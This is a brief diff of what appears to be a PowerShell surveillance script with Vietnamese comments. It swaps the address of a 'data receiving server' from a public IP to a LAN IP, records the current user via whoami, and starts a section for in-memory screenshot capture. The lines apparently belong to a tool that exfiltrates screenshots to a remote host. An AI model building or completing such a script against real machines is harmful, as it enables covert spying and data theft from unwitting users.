@@ -1,5 +1,5 @@
 # Địa chỉ server nhận dữ liệu
-$hq = "http://157.245.57.163:2024"
+$hq = "http://192.168.102.132:2024"
 $name = whoami
 
 # Chụp màn hình trực tiếp vào bộ nhớ
